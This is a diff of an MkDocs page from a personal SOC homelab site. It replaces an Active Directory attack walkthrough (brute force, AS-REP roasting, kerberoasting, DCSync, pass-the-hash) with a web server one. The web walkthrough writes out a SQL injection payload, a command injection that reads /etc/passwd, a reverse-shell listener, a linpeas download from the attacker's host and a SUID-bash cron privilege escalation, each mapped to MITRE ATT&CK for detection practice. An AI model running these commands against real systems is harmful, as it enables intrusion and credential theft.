@@ -6,18 +6,18 @@
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
-        <meta name="description" content="Hands-on SOC homelab: Security Onion, AD, DMZ honeypot, ATT&CK-mapped detections.">
+        <meta name="description" content="Devin's Hands-on SOC homelab: Security Onion, AD, DMZ honeypot, ATT&CK-mapped detections.">
       
       
       
       
-        <link rel="prev" href="../vm/webserver/">
+        <link rel="prev" href="../AD/">
       
       
-        <link rel="next" href="../detections/">
+        <link rel="next" href="../../detections/AD/">
       
       
-      <link rel="icon" href="../assets/images/favicon.png">
+      <link rel="icon" href="../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.17">
     
     
@@ -26,7 +26,7 @@
       
     
     
-      <link rel="stylesheet" href="../assets/stylesheets/main.7e37652d.min.css">
+      <link rel="stylesheet" href="../../assets/stylesheets/main.7e37652d.min.css">
       
       
 
@@ -45,16 +45,16 @@
       
     
     
-      <link rel="stylesheet" href="../stylesheets/extra.css">
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
     
-    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
     
     
     
-   <link href="../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>
+   <link href="../../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>
     html.glightbox-open { overflow: initial; height: 100%; }
     .gslide-title { margin-top: 0px; user-select: text; }
     .gslide-desc { color: #666; user-select: text; }
@@ -63,7 +63,7 @@
     .gdesc-inner { font-size: 0.75rem; }
     body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color);}
     body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color);}
-    body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color);}</style> <script src="../assets/javascripts/glightbox.min.js"></script></head>
+    body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color);}</style> <script src="../../assets/javascripts/glightbox.min.js"></script></head>
   
   
     <body dir="ltr">
@@ -75,7 +75,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#attack-scenarios-mapped-to-mitre-attck" class="md-skip">
+        <a href="#web-server-attack-scenarios-mapped-to-mitre-attck" class="md-skip">
           Skip to content
         </a>
       
@@ -89,7 +89,7 @@
 
 <header class="md-header" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href=".." title="Devin&#39;s SOC Homelab" class="md-header__button md-logo" aria-label="Devin's SOC Homelab" data-md-component="logo">
+    <a href="../.." title="Devin&#39;s SOC Homelab" class="md-header__button md-logo" aria-label="Devin's SOC Homelab" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -182,7 +182,7 @@
   
   
     <li class="md-tabs__item">
-      <a href=".." class="md-tabs__link">
+      <a href="../.." class="md-tabs__link">
         
   
   
@@ -201,7 +201,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../topology/" class="md-tabs__link">
+      <a href="../../topology/" class="md-tabs__link">
         
   
   
@@ -222,7 +222,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../vm/security-onion/" class="md-tabs__link">
+        <a href="../../vm/security-onion/" class="md-tabs__link">
           
   
   
@@ -243,17 +243,20 @@
     
   
   
-    <li class="md-tabs__item md-tabs__item--active">
-      <a href="./" class="md-tabs__link">
-        
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../AD/" class="md-tabs__link">
+          
   
   
     
   
   Attack Scenarios (MITRE)
 
-      </a>
-    </li>
+        </a>
+      </li>
+    
   
 
       
@@ -262,17 +265,20 @@
   
   
   
-    <li class="md-tabs__item">
-      <a href="../detections/" class="md-tabs__link">
-        
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../detections/AD/" class="md-tabs__link">
+          
   
   
     
   
   Detections & Dashboards
 
-      </a>
-    </li>
+        </a>
+      </li>
+    
   
 
       
@@ -281,17 +287,20 @@
   
   
   
-    <li class="md-tabs__item">
-      <a href="../ir/" class="md-tabs__link">
-        
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../ir/AD/" class="md-tabs__link">
+          
   
   
     
   
   IR Playbooks
 
-      </a>
-    </li>
+        </a>
+      </li>
+    
   
 
       
@@ -317,7 +326,7 @@
 
 <nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href=".." title="Devin&#39;s SOC Homelab" class="md-nav__button md-logo" aria-label="Devin's SOC Homelab" data-md-component="logo">
+    <a href="../.." title="Devin&#39;s SOC Homelab" class="md-nav__button md-logo" aria-label="Devin's SOC Homelab" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -335,7 +344,7 @@
   
   
     <li class="md-nav__item">
-      <a href=".." class="md-nav__link">
+      <a href="../.." class="md-nav__link">
         
   
   
@@ -357,7 +366,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../topology/" class="md-nav__link">
+      <a href="../../topology/" class="md-nav__link">
         
   
   
@@ -432,7 +441,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../vm/security-onion/" class="md-nav__link">
+      <a href="../../vm/security-onion/" class="md-nav__link">
         
   
   
@@ -455,7 +464,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../vm/dc/" class="md-nav__link">
+      <a href="../../vm/dc/" class="md-nav__link">
         
   
   
@@ -478,7 +487,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../vm/workstation/" class="md-nav__link">
+      <a href="../../vm/workstation/" class="md-nav__link">
         
   
   
@@ -501,7 +510,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../vm/webserver/" class="md-nav__link">
+      <a href="../../vm/webserver/" class="md-nav__link">
         
   
   
@@ -532,6 +541,83 @@
   
   
   
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    Attack Scenarios (MITRE)
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            Attack Scenarios (MITRE)
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../AD/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Active Directory
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
     <li class="md-nav__item md-nav__item--active">
       
       <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
@@ -545,7 +631,7 @@
   
   
   <span class="md-ellipsis">
-    Attack Scenarios (MITRE)
+    Web Server
     
   </span>
   
@@ -558,7 +644,7 @@
   
   
   <span class="md-ellipsis">
-    Attack Scenarios (MITRE)
+    Web Server
     
   </span>
   
@@ -581,99 +667,63 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#brute-forcing-guest-account" class="md-nav__link">
+  <a href="#directory-busting" class="md-nav__link">
     <span class="md-ellipsis">
-      Brute Forcing Guest Account
+      Directory Busting
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#enumerating-smb-shares" class="md-nav__link">
+  <a href="#sql-injection" class="md-nav__link">
     <span class="md-ellipsis">
-      Enumerating SMB Shares
+      SQL Injection
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#asreproast-domain-account" class="md-nav__link">
+  <a href="#command-injection" class="md-nav__link">
     <span class="md-ellipsis">
-      ASReproast Domain Account
+      Command Injection
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#winrm-shell-with-domain-account" class="md-nav__link">
+  <a href="#reverse-shell" class="md-nav__link">
     <span class="md-ellipsis">
-      WinRM Shell with Domain Account
+      Reverse Shell
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#upload-of-sharphound" class="md-nav__link">
+  <a href="#download-linpeas" class="md-nav__link">
     <span class="md-ellipsis">
-      Upload of SharpHound
+      Download Linpeas
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#execution-of-sharphound" class="md-nav__link">
+  <a href="#execute-linpeas" class="md-nav__link">
     <span class="md-ellipsis">
-      Execution of SharpHound
+      Execute Linpeas
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#exfiltration-of-data-collected-by-sharphound" class="md-nav__link">
+  <a href="#escalate-privileges-through-cronjob" class="md-nav__link">
     <span class="md-ellipsis">
-      Exfiltration of Data Collected by SharpHound
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#bloodhound" class="md-nav__link">
-    <span class="md-ellipsis">
-      Bloodhound
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#kerberoast-of-svc-test" class="md-nav__link">
-    <span class="md-ellipsis">
-      Kerberoast of svc-test
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#dcsync" class="md-nav__link">
-    <span class="md-ellipsis">
-      DCSync
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#pass-the-hash-to-login-as-domain-admin" class="md-nav__link">
-    <span class="md-ellipsis">
-      Pass-the-hash to Login as Domain Admin
+      Escalate Privileges Through Cronjob
     </span>
   </a>
   
@@ -686,25 +736,11 @@
     </li>
   
 
-    
+              
+            
+          </ul>
+        </nav>
       
-      
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../detections/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    Detections & Dashboards
-    
-  </span>
-  
-
-      </a>
     </li>
   
 
@@ -715,9 +751,133 @@
   
   
   
-    <li class="md-nav__item">
-      <a href="../ir/" class="md-nav__link">
+    
+    
+      
         
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Detections & Dashboards
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            Detections & Dashboards
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../detections/AD/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Active Directory
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../detections/web/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Web Server
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
   
   
   <span class="md-ellipsis">
@@ -726,7 +886,65 @@
   </span>
   
 
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            IR Playbooks
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ir/AD/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Active Directory
+    
+  </span>
+  
+
       </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ir/web/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Web Server
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
     </li>
   
 
@@ -758,99 +976,63 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#brute-forcing-guest-account" class="md-nav__link">
+  <a href="#directory-busting" class="md-nav__link">
     <span class="md-ellipsis">
-      Brute Forcing Guest Account
+      Directory Busting
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#enumerating-smb-shares" class="md-nav__link">
+  <a href="#sql-injection" class="md-nav__link">
     <span class="md-ellipsis">
-      Enumerating SMB Shares
+      SQL Injection
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#asreproast-domain-account" class="md-nav__link">
+  <a href="#command-injection" class="md-nav__link">
     <span class="md-ellipsis">
-      ASReproast Domain Account
+      Command Injection
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#winrm-shell-with-domain-account" class="md-nav__link">
+  <a href="#reverse-shell" class="md-nav__link">
     <span class="md-ellipsis">
-      WinRM Shell with Domain Account
+      Reverse Shell
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#upload-of-sharphound" class="md-nav__link">
+  <a href="#download-linpeas" class="md-nav__link">
     <span class="md-ellipsis">
-      Upload of SharpHound
+      Download Linpeas
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#execution-of-sharphound" class="md-nav__link">
+  <a href="#execute-linpeas" class="md-nav__link">
     <span class="md-ellipsis">
-      Execution of SharpHound
+      Execute Linpeas
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#exfiltration-of-data-collected-by-sharphound" class="md-nav__link">
+  <a href="#escalate-privileges-through-cronjob" class="md-nav__link">
     <span class="md-ellipsis">
-      Exfiltration of Data Collected by SharpHound
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#bloodhound" class="md-nav__link">
-    <span class="md-ellipsis">
-      Bloodhound
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#kerberoast-of-svc-test" class="md-nav__link">
-    <span class="md-ellipsis">
-      Kerberoast of svc-test
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#dcsync" class="md-nav__link">
-    <span class="md-ellipsis">
-      DCSync
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#pass-the-hash-to-login-as-domain-admin" class="md-nav__link">
-    <span class="md-ellipsis">
-      Pass-the-hash to Login as Domain Admin
+      Escalate Privileges Through Cronjob
     </span>
   </a>
   
@@ -872,84 +1054,64 @@
 
 
 
-<h1 id="attack-scenarios-mapped-to-mitre-attck">Attack Scenarios (mapped to MITRE ATT&amp;CK)<a class="headerlink" href="#attack-scenarios-mapped-to-mitre-attck" title="Permanent link">&para;</a></h1>
-<p>Passwords and hashes have been concealed to retain confidentiality.</p>
-<h2 id="brute-forcing-guest-account"><u>Brute Forcing Guest Account</u><a class="headerlink" href="#brute-forcing-guest-account" title="Permanent link">&para;</a></h2>
+<h1 id="web-server-attack-scenarios-mapped-to-mitre-attck">Web Server Attack Scenarios (mapped to MITRE ATT&amp;CK)<a class="headerlink" href="#web-server-attack-scenarios-mapped-to-mitre-attck" title="Permanent link">&para;</a></h1>
+<p><u><strong>Passwords and hashes have been concealed to retain confidentiality.</strong></u></p>
+<h2 id="directory-busting"><u>Directory Busting</u><a class="headerlink" href="#directory-busting" title="Permanent link">&para;</a></h2>
 <ul>
-<li><strong>Techniques:</strong> T1110.001 (Brute Force: Password Guessing)</li>
+<li><strong>Techniques:</strong> T1595.003 (Active Scanning: Wordlist Scanning)</li>
 <li><strong>Procedure:</strong></li>
 </ul>
-<p><code>nxc ldap 192.168.25.137 -u 'Guest' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding</code>
-<a class="glightbox" href="img/1.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="1" loading="lazy" src="img/1.png" /></a></p>
-<h2 id="enumerating-smb-shares"><u>Enumerating SMB Shares</u><a class="headerlink" href="#enumerating-smb-shares" title="Permanent link">&para;</a></h2>
+<p><code>feroxbuster -u http://192.168.25.142 -w /usr/share/wordlists/dirbuster/directory-list.txt</code>
+<a class="glightbox" href="../img/a.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="1" loading="lazy" src="../img/a.png" /></a></p>
+<h2 id="sql-injection"><u>SQL Injection</u><a class="headerlink" href="#sql-injection" title="Permanent link">&para;</a></h2>
 <ul>
-<li><strong>Techniques:</strong> T1135 (Network Share Discovery)</li>
+<li><strong>Techniques:</strong> T1190 (Exploit Public-Facing Application)</li>
 <li><strong>Procedure:</strong></li>
 </ul>
-<p><code>nxc smb 192.168.25.141 -u 'Guest' -p '_________' --shares</code>
-<a class="glightbox" href="img/2.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="2" loading="lazy" src="img/2.png" /></a></p>
-<h2 id="asreproast-domain-account"><u>ASReproast Domain Account</u><a class="headerlink" href="#asreproast-domain-account" title="Permanent link">&para;</a></h2>
+<p><code>admin' OR '1'='1--</code>
+<a class="glightbox" href="../img/2a.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="1" loading="lazy" src="../img/2a.png" /></a>
+<a class="glightbox" href="../img/2b.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="1" loading="lazy" src="../img/2b.png" /></a></p>
+<h2 id="command-injection"><u>Command Injection</u><a class="headerlink" href="#command-injection" title="Permanent link">&para;</a></h2>
 <ul>
-<li><strong>Techniques:</strong> T1558.004 (Steal or Forge Kerberos Tickets: AS-REP Roasting), T1110.002 (Brute Force: Password Cracking)</li>
+<li><strong>Techniques:</strong> T1059.004 (Command and Scripting Interpreter: Unix Shell)</li>
 <li><strong>Procedure:</strong></li>
 </ul>
-<p><code>nxc ldap 192.168.25.137 -u 'Bob' -p '' --asreproast asreproast.txt</code>
-<a class="glightbox" href="img/3.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="3" loading="lazy" src="img/3.png" /></a></p>
-<p><code>john --wordlist=/usr/share/wordlists/rockyou.txt asreproast.txt</code>
-<a class="glightbox" href="img/4.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="4" loading="lazy" src="img/4.png" /></a></p>
-<h2 id="winrm-shell-with-domain-account"><u>WinRM Shell with Domain Account</u><a class="headerlink" href="#winrm-shell-with-domain-account" title="Permanent link">&para;</a></h2>
+<p><code>127.0.0.1 &amp;&amp; cat /etc/passwd</code>
+<a class="glightbox" href="../img/1a.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="2" loading="lazy" src="../img/1a.png" /></a>
+<a class="glightbox" href="../img/1b.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="1" loading="lazy" src="../img/1b.png" /></a></p>
+<h2 id="reverse-shell"><u>Reverse Shell</u><a class="headerlink" href="#reverse-shell" title="Permanent link">&para;</a></h2>
 <ul>
-<li><strong>Techniques:</strong> T1078 (Valid Accounts), T1021.006 (Remote Services: Windows Remote Management)</li>
+<li><strong>Techniques:</strong> T1505.003 (Server Software Component: Web Shell)</li>
 <li><strong>Procedure:</strong></li>
 </ul>
-<p><code>evil-winrm -i 192.168.25.137 -u 'bob' -p '_________’</code>
-<a class="glightbox" href="img/6.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="5" loading="lazy" src="img/6.png" /></a></p>
-<h2 id="upload-of-sharphound"><u>Upload of SharpHound</u><a class="headerlink" href="#upload-of-sharphound" title="Permanent link">&para;</a></h2>
+<p><code>nc -nvlp 9001</code>
+<a class="glightbox" href="../img/3a.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="3" loading="lazy" src="../img/3a.png" /></a>
+<a class="glightbox" href="../img/3c.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="4" loading="lazy" src="../img/3c.png" /></a>
+<a class="glightbox" href="../img/3b.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="1" loading="lazy" src="../img/3b.png" /></a></p>
+<h2 id="download-linpeas"><u>Download Linpeas</u><a class="headerlink" href="#download-linpeas" title="Permanent link">&para;</a></h2>
 <ul>
-<li><strong>Techniques:</strong> T1021.006 (Remote Services: Windows Remote Management), T1059.003 (Command and Scripting Interpreter: Windows Command Shell)</li>
+<li><strong>Techniques:</strong> T1105 (Ingress Tool Transfer)</li>
 <li><strong>Procedure:</strong></li>
 </ul>
-<p><code>upload SharpHound.exe</code>
-<a class="glightbox" href="img/7.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="7" loading="lazy" src="img/7.png" /></a></p>
-<h2 id="execution-of-sharphound"><u>Execution of SharpHound</u><a class="headerlink" href="#execution-of-sharphound" title="Permanent link">&para;</a></h2>
+<p><code>python -m http.server 80</code>
+<code>wget http://192.168.25.130:80/linpeas.sh</code>
+<a class="glightbox" href="../img/4b.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="5" loading="lazy" src="../img/4b.png" /></a>
+<a class="glightbox" href="../img/4a.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="1" loading="lazy" src="../img/4a.png" /></a></p>
+<h2 id="execute-linpeas"><u>Execute Linpeas</u><a class="headerlink" href="#execute-linpeas" title="Permanent link">&para;</a></h2>
 <ul>
-<li><strong>Techniques:</strong> T1069.002 (Permission Group Discovery: Domain Groups), T1087.002 (Account Discovery), T1018 (Remote System Discovery), T1482 (Domain Trust Discovery), T1560 (Archive Collected Data)</li>
+<li><strong>Techniques:</strong> T1082 (System Information Discovery)</li>
 <li><strong>Procedure:</strong></li>
 </ul>
-<p><code>./SharpHound.exe</code>
-<a class="glightbox" href="img/8.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="8" loading="lazy" src="img/8.png" /></a></p>
-<h2 id="exfiltration-of-data-collected-by-sharphound"><u>Exfiltration of Data Collected by SharpHound</u><a class="headerlink" href="#exfiltration-of-data-collected-by-sharphound" title="Permanent link">&para;</a></h2>
+<p><code>./linpeas.sh</code>
+<a class="glightbox" href="../img/5a.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="7" loading="lazy" src="../img/5a.png" /></a></p>
+<h2 id="escalate-privileges-through-cronjob"><u>Escalate Privileges Through Cronjob</u><a class="headerlink" href="#escalate-privileges-through-cronjob" title="Permanent link">&para;</a></h2>
 <ul>
-<li><strong>Techniques:</strong> T1041 (Exfiltration Over C2 Channel)</li>
+<li><strong>Techniques:</strong> T1053.003 (Scheduled Task/Job: Cron) T1548.001 (Abuse Elevation Control Mechanism: Setuid/Setgid)</li>
 <li><strong>Procedure:</strong></li>
 </ul>
-<p><code>download 20250910173643_BloodHound.zip</code>
-<a class="glightbox" href="img/10.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="10" loading="lazy" src="img/10.png" /></a></p>
-<h2 id="bloodhound"><u>Bloodhound</u><a class="headerlink" href="#bloodhound" title="Permanent link">&para;</a></h2>
-<p><a class="glightbox" href="img/11.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="11" loading="lazy" src="img/11.png" /></a></p>
-<h2 id="kerberoast-of-svc-test"><u>Kerberoast of svc-test</u><a class="headerlink" href="#kerberoast-of-svc-test" title="Permanent link">&para;</a></h2>
-<ul>
-<li><strong>Techniques:</strong> T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting), T1110.002 (Brute Force: Password Cracking), T1078.002 (Valid Accounts: Domain Accounts)</li>
-<li><strong>Procedure:</strong></li>
-</ul>
-<p><code>nxc ldap 192.168.25.137 -u 'Bob' -p '_________' --kerberoasting kerbroast.txt</code>
-<a class="glightbox" href="img/12.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="12" loading="lazy" src="img/12.png" /></a>
-<code>john --wordlist=/usr/share/wordlists/rockyou.txt kerbroast.txt</code>
-<a class="glightbox" href="img/13.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="13" loading="lazy" src="img/13.png" /></a></p>
-<h2 id="dcsync"><u>DCSync</u><a class="headerlink" href="#dcsync" title="Permanent link">&para;</a></h2>
-<ul>
-<li><strong>Techniques:</strong> T1003.006 (OS Credential Dumping: DCSync), T1078.002 (Valid Accounts: Domain Accounts)</li>
-<li><strong>Procedure:</strong></li>
-</ul>
-<p><code>impacket-secretsdump -just-dc LAB/svc-test:'_________'@WIN-LLBIAPV2E9D.lab.local</code>
-<a class="glightbox" href="img/14.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="14" loading="lazy" src="img/14.png" /></a></p>
-<h2 id="pass-the-hash-to-login-as-domain-admin"><u>Pass-the-hash to Login as Domain Admin</u><a class="headerlink" href="#pass-the-hash-to-login-as-domain-admin" title="Permanent link">&para;</a></h2>
-<ul>
-<li><strong>Techniques:</strong> T1550.002 (Use Alternate Authentication Material: Pass the Hash), T1078 (Valid Accounts), T1021.006 (Remote Services: Windows Remote Management)</li>
-<li><strong>Procedure:</strong></li>
-</ul>
-<p><code>evil-winrm -i 192.168.25.137 -u 'Administrator' -H '__________________’</code>
-<a class="glightbox" href="img/15.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="15" loading="lazy" src="img/15.png" /></a></p>
+<p><code>echo 'cp /bin/bash /home/bash; chmod +s /home/bash' &gt; /home/report.sh</code>
+<code>./home/bash -p</code>
+<a class="glightbox" href="../img/6a.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="8" loading="lazy" src="../img/6a.png" /></a></p>
 
 
 
@@ -1001,10 +1163,10 @@
     
     
       
-      <script id="__config" type="application/json">{"base": "..", "features": ["navigation.tabs", "navigation.sections", "navigation.indexes", "content.code.copy"], "search": "../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs", "navigation.sections", "navigation.indexes", "content.code.copy"], "search": "../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="../assets/javascripts/bundle.92b07e13.min.js"></script>
+      <script src="../../assets/javascripts/bundle.92b07e13.min.js"></script>
       
     
   <script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
